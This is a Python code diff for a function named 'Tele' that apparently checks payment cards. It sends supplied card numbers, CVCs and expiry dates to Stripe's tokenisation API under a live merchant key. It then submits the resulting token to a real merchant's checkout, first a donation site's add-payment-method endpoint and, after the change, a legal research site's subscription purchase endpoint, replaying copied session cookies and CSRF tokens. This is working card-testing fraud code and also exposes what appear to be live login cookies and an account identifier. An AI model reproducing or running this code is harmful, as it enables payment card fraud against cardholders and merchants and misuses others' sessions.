@@ -21,53 +21,64 @@ def Tele(ccx):
     
     user_agent = UserAgent().random
     
-    data = f'type=card&card[number]={n}&card[cvc]={cvp}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IT&payment_user_agent=stripe.js%2Fc0b5539ba7%3B+stripe-js-v3%2Fc0b5539ba7%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fmarclesser.net&time_on_page=28779&client_attribution_metadata[client_session_id]=f82903ff-abf4-4c12-bdcd-56676284a433&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=d8e89c41-bd77-4d16-9216-d609823c13914c8545&muid=376f420b-e3fc-48de-acf5-63bcdf7835b244a31c&sid=7a7edb4e-931a-4c0b-b363-d35ddef2d5270fb543&key=pk_live_51FlhREGarDw2Uq2Hq7QcYtNGVnLE0lDltvQbP0xpHeyLlDAFKolfZi5K1hlTsuJ6O696Geh8O2Vg9IDb0BVQBlnN00kWU4vniy&_stripe_version=2024-06-20'
+    data = f'guid=d8e89c41-bd77-4d16-9216-d609823c13914c8545&muid=4f201248-fae5-4ef8-84af-7431fbc132a0f0f37a&sid=8cd75d21-fae5-4a22-929c-15f6ccd79a52a02186&referrer=https%3A%2F%2Ftrellis.law&time_on_page=33755&card[name]=John+Libertt&card[number]={n}&card[cvc]=,{cvc}&card[exp_month]=11&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fc0b5539ba7%3B+stripe-js-v3%2Fc0b5539ba7%3B+split-card-element&key=pk_live_4xBSuaxricW1SmAkbwdiYH9h'
 
-    response = r.post('https://api.stripe.com/v1/payment_methods',data=data)
-    
+    response = requests.post('https://api.stripe.com/v1/tokens', data=data)
     try:
-        id = response.json()['id']
-    except:
-        return response.json()
+        id=(response.json()['id'])
+    except KeyError:
+        print(response.json())
     
 
     cookies = {
-    'wffn_traffic_source': 'https://www.google.com/',
-    'wffn_flt': '2025-6-8 00:31:32',
-    'wffn_timezone': 'Asia/Rangoon',
-    'wffn_is_mobile': 'true',
-    'wffn_browser': 'Chrome',
-    'wffn_referrer': 'https://www.google.com/',
-    'wffn_fl_url': '/donate/',
-    'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_first_add': 'fd%3D2025-06-08%2007%3A01%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fmarclesser.net%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
-    '_wpfuuid': '512c43ed-9276-497d-842f-ddc58856e22d',
-    'sbjs_current_add': 'fd%3D2025-06-08%2007%3A01%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fmarclesser.net%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-    'hu-consent': '{"consent":true,"consentLevel":1,"consentID":"d6fb7578-47ed-4f8e-acc1-ef52d70e4bc0","categories":{"1":true,"2":false,"3":false,"4":false},"expiry":30,"timestamp":1749367913601,"blocking":{"blocked":8,"allowed":0,"blockedServices":["2","3","9","58","93"],"allowedServices":[]},"lastVersion":1,"bannerConfigVersion":"2.4.0"}',
-    '_fbp': 'fb.1.1749367931457.748882617728461705',
-    '_gid': 'GA1.2.420698417.1749367933',
-    '__stripe_mid': '376f420b-e3fc-48de-acf5-63bcdf7835b244a31c',
-    '__stripe_sid': '7a7edb4e-931a-4c0b-b363-d35ddef2d5270fb543',
-    'wordpress_logged_in_30d768da89e7428ca6fa2345e108320f': 'htetmyathtunn2377%7C1749541032%7CDcuTl7dHg1zFOWFRgn6tU4CV5PN6OcgvL946Er7XOqs%7C2da0f33b7c2c66552499abbf9779732735d1f2458b8454c9433ae5bd9a5877c8',
-    '_fk_contact_uid': '5c7ef634052bf246776e7e4cf6bf9503',
-    'wfwaf-authcookie-6ec01d327ab4d8539633721077a079ea': '225%7Cother%7Cread%7Cc28dbaa704f068e70328e8e5018937dda02fe14ddac322176622af5a3181cd2d',
-    'sbjs_session': 'pgs%3D24%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmarclesser.net%2Fmy-account%2Fadd-payment-method%2F',
-    '_ga': 'GA1.2.454612520.1749367932',
-    '_gat_UA-131004846-1': '1',
-    '_ga_SGSFK130B5': 'GS2.1.s1749367931$o1$g1$t1749368314$j59$l0$h0',
+    'states_selected': 'ca',
+    'SIGNUP_VERSION': 'signup_google',
+    'PURCHASE_VERSION': 'purchase_lawyer_baseline',
+    'NON_LAWYER_PURCHASE_VERSION': 'purchase_non_lawyer_plan_name_07112022_b',
+    'AUTHENTICATED_ACCESS': 'partial_access',
+    'TRIAL_ACTIONS_VERSION': 'False10',
+    'NON_LAWYER_PRICING_VERSION': 'non_lawyer_pricing_baseline',
+    'LAWYER_PRICING_VERSION': 'lawyer_pricing_baseline',
+    'ALERT_PLG_TEST': 'VariantViridian',
+    'HUBSPOT_LAWYER_VERSION': 'baseline',
+    'AI_PLG_TEST_VERSION': 'VariantBlueberry',
+    'version_distinct_id': '830d8ca6-6fa2-4c11-b951-16754d3d4d3d',
+    '_gid': 'GA1.2.57044549.1749399396',
+    'AMPLITUDE_DEVICE_ID': '10aa7817-63d5-483f-9f7d-c30d95ee42ecR',
+    'post_logged_in_path': 'L2RvYy84NDI0ODY5My9hdHRhY2htZW50LWFjY291bnQtZG9jdW1lbnRzLXN0YXR1cy1jb3BpZXM',
+    '_gcl_au': '1.1.1872797387.1749399396.668343485.1749399407.1749399418',
+    'trellis_marketing_selected_plan': 'personal',
+    'USER_AUTHENTICATED': 'True',
+    'csrftoken': 'r3PSWxSxnfbN2P8oOYfooF08S28nYHz8',
+    'sessionid': '9h4slxe0obq9u41pp9ohlfihg4sg5p5z',
+    '_hjSessionUser_2494852': 'eyJpZCI6Ijg5ZGE5NWFlLTNmOGItNTNiZC1iN2M2LTVhMjU0MjgzMDM0MiIsImNyZWF0ZWQiOjE3NDkzOTk0MjU4NjUsImV4aXN0aW5nIjp0cnVlfQ==',
+    '_hjSession_2494852': 'eyJpZCI6ImU1NjAyZDBkLTkzNzItNDU1Ni05MWE3LWEzYjVlNzcxNTM4NSIsImMiOjE3NDkzOTk0MjU4NzAsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
+    '_hjHasCachedUserAttributes': 'true',
+    'raw_query': '',
+    '__stripe_mid': '4f201248-fae5-4ef8-84af-7431fbc132a0f0f37a',
+    '__stripe_sid': '8cd75d21-fae5-4a22-929c-15f6ccd79a52a02186',
+    '__hstc': '12320555.8bb4bdf20c97448d102cde95027a1515.1749399525435.1749399525435.1749399525435.1',
+    'hubspotutk': '8bb4bdf20c97448d102cde95027a1515',
+    '__hssrc': '1',
+    '__hssc': '12320555.1.1749399525441',
+    'NEW_TRIAL': 'true',
+    'NEW_TRIAL_COOLDOWN': 'true',
+    '_hjUserAttributesHash': '0717cfc84321b384bf4bc4d676e95611',
+    'adblockEnabled': 'false',
+    'trellis_marketing_interval': 'month',
+    '_rdt_uuid': '1749399395488.e3feac45-51bc-4aa3-9723-2648e69b5fc4',
+    '_ga': 'GA1.2.2064210056.1749399396',
+    '_ga_RV7MFETMFQ': 'GS2.1.s1749399396$o1$g1$t1749399585$j17$l0$h0',
+    'amplitude_id_5d3e6ed10c963f7039f987570bed5b5ftrellis.law': 'eyJkZXZpY2VJZCI6IjEwYWE3ODE3LTYzZDUtNDgzZi05ZjdkLWMzMGQ5NWVlNDJlY1IiLCJ1c2VySWQiOiJodGV0bXlhdGh0dW5uMjM3N0BnbWFpbC5jb20iLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE3NDkzOTkzOTU1NDgsImxhc3RFdmVudFRpbWUiOjE3NDkzOTk2MTI5NDIsImV2ZW50SWQiOjQ1LCJpZGVudGlmeUlkIjozMywic2VxdWVuY2VOdW1iZXIiOjc4fQ==',
 }
 
     headers = {
-    'authority': 'marclesser.net',
+    'authority': 'trellis.law',
     'accept': '*/*',
     'accept-language': 'en-US,en;q=0.9',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    # 'cookie': 'wffn_traffic_source=https://www.google.com/; wffn_flt=2025-6-8 00:31:32; wffn_timezone=Asia/Rangoon; wffn_is_mobile=true; wffn_browser=Chrome; wffn_referrer=https://www.google.com/; wffn_fl_url=/donate/; sbjs_migrations=1418474375998%3D1; sbjs_first_add=fd%3D2025-06-08%2007%3A01%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fmarclesser.net%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36; _wpfuuid=512c43ed-9276-497d-842f-ddc58856e22d; sbjs_current_add=fd%3D2025-06-08%2007%3A01%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fmarclesser.net%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; hu-consent={"consent":true,"consentLevel":1,"consentID":"d6fb7578-47ed-4f8e-acc1-ef52d70e4bc0","categories":{"1":true,"2":false,"3":false,"4":false},"expiry":30,"timestamp":1749367913601,"blocking":{"blocked":8,"allowed":0,"blockedServices":["2","3","9","58","93"],"allowedServices":[]},"lastVersion":1,"bannerConfigVersion":"2.4.0"}; _fbp=fb.1.1749367931457.748882617728461705; _gid=GA1.2.420698417.1749367933; __stripe_mid=376f420b-e3fc-48de-acf5-63bcdf7835b244a31c; __stripe_sid=7a7edb4e-931a-4c0b-b363-d35ddef2d5270fb543; wordpress_logged_in_30d768da89e7428ca6fa2345e108320f=htetmyathtunn2377%7C1749541032%7CDcuTl7dHg1zFOWFRgn6tU4CV5PN6OcgvL946Er7XOqs%7C2da0f33b7c2c66552499abbf9779732735d1f2458b8454c9433ae5bd9a5877c8; _fk_contact_uid=5c7ef634052bf246776e7e4cf6bf9503; wfwaf-authcookie-6ec01d327ab4d8539633721077a079ea=225%7Cother%7Cread%7Cc28dbaa704f068e70328e8e5018937dda02fe14ddac322176622af5a3181cd2d; sbjs_session=pgs%3D24%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmarclesser.net%2Fmy-account%2Fadd-payment-method%2F; _ga=GA1.2.454612520.1749367932; _gat_UA-131004846-1=1; _ga_SGSFK130B5=GS2.1.s1749367931$o1$g1$t1749368314$j59$l0$h0',
-    'origin': 'https://marclesser.net',
-    'referer': 'https://marclesser.net/my-account/add-payment-method/',
+    'content-type': 'application/json; charset=UTF-8',
+    'origin': 'https://trellis.law',
+    'referer': 'https://trellis.law/checkout',
     'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -75,22 +86,22 @@ def Tele(ccx):
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+    'x-csrftoken': 's8u2Ph6T2J8pRftNmpCUEa1O8XKivW3KJ19KBEOgfO92JUr10dH8SFRMQPIvjtsI',
     'x-requested-with': 'XMLHttpRequest',
 }
 
-    params = {
-    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
-}
-
     data = {
-    'action': 'create_and_confirm_setup_intent',
-    'wc-stripe-payment-method': id,
-    'wc-stripe-payment-type': 'card',
-    '_ajax_nonce': '1bda1d6670',
+    "plan": "personal_0912_monthly",
+    "token": id,
+    "csrfmiddlewaretoken":                         "s8u2Ph6T2J8pRftNmpCUEa1O8XKivW3KJ19KBEOgfO92JUr10dH8SFRMQPIvjtsI",
+    "state": ["ca"],
+    "add_on_ids": [""]
 }
 
-    responsey = r.post('https://marclesser.net/', params=params, cookies=cookies, headers=headers, data=data)
-   # print(responsey.text)
+    responsey = requests.post('https://trellis.law/api/purchase/subscription',            cookies=cookies,
+    headers=headers,
+    json=data
+)
     
     try:
         return responsey.json()
